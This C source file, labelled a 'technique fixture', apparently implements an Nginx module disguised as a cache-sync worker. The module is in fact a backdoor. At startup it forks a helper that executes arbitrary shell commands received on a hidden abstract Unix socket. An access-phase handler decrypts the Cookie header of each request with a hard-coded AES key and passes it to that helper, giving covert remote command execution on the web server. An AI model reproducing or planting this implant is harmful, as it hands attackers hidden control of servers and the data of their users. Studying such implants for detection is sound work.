/* Request-gated command helper in an Nginx HTTP module (technique fixture). */
#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <openssl/evp.h>

#define HELPER_NAME "ngx_cache_sync_worker"

static ngx_int_t ngx_http_cache_sync_handler(ngx_http_request_t *r);
static ngx_int_t ngx_http_cache_sync_init(ngx_conf_t *cf);

static ngx_http_module_t ngx_http_cache_sync_module_ctx = {
    NULL, ngx_http_cache_sync_init, NULL, NULL, NULL, NULL, NULL, NULL
};

ngx_module_t ngx_http_cache_sync_module = {
    NGX_MODULE_V1, &ngx_http_cache_sync_module_ctx, NULL, NGX_HTTP_MODULE,
    NULL, NULL, NULL, NULL, NULL, NULL, NULL, NGX_MODULE_V1_PADDING
};

static int helper_addr(struct sockaddr_un *sa)
{
    ngx_memzero(sa, sizeof(*sa));
    sa->sun_family = AF_UNIX;
    sa->sun_path[0] = 0;
    ngx_memcpy(sa->sun_path + 1, HELPER_NAME, sizeof(HELPER_NAME) - 1);
    return offsetof(struct sockaddr_un, sun_path) + sizeof(HELPER_NAME);
}

static int open_cmd(const unsigned char *key, const unsigned char *in, int inlen,
                    unsigned char *out)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int n = 0, f = 0;
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, key + 32);
    EVP_DecryptUpdate(ctx, out, &n, in, inlen);
    EVP_DecryptFinal_ex(ctx, out + n, &f);
    EVP_CIPHER_CTX_free(ctx);
    out[n + f] = 0;
    return n + f;
}

static void helper_loop(void)
{
    struct sockaddr_un sa;
    int len = helper_addr(&sa);
    int ls = socket(AF_UNIX, SOCK_STREAM, 0);
    bind(ls, (struct sockaddr *) &sa, len);
    listen(ls, 8);
    for (;;) {
        char cmd[4096], buf[4096];
        int c = accept(ls, NULL, NULL);
        ssize_t n = read(c, cmd, sizeof(cmd) - 1);
        if (n <= 0) { close(c); continue; }
        cmd[n] = 0;
        FILE *p = popen(cmd, "r");
        size_t got;
        while (p && (got = fread(buf, 1, sizeof(buf), p)) > 0) {
            write(c, buf, got);
        }
        if (p) pclose(p);
        close(c);
    }
}

static ngx_int_t ngx_http_cache_sync_handler(ngx_http_request_t *r)
{
    static const unsigned char key[48] = {0};
    unsigned char plain[4096];
    struct sockaddr_un sa;
    ngx_table_elt_t *h = r->headers_in.cookie;
    if (h == NULL) {
        return NGX_DECLINED;
    }
    open_cmd(key, h->value.data, (int) h->value.len, plain);
    int len = helper_addr(&sa);
    int s = socket(AF_UNIX, SOCK_STREAM, 0);
    if (connect(s, (struct sockaddr *) &sa, len) != 0) {
        return NGX_DECLINED;
    }
    write(s, plain, ngx_strlen(plain));
    close(s);
    return NGX_OK;
}

static ngx_int_t ngx_http_cache_sync_init(ngx_conf_t *cf)
{
    ngx_http_handler_pt *h;
    ngx_http_core_main_conf_t *cmcf;
    if (fork() == 0) {
        helper_loop();
    }
    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);
    h = ngx_array_push(&cmcf->phases[NGX_HTTP_ACCESS_PHASE].handlers);
    *h = ngx_http_cache_sync_handler;
    return NGX_OK;
}
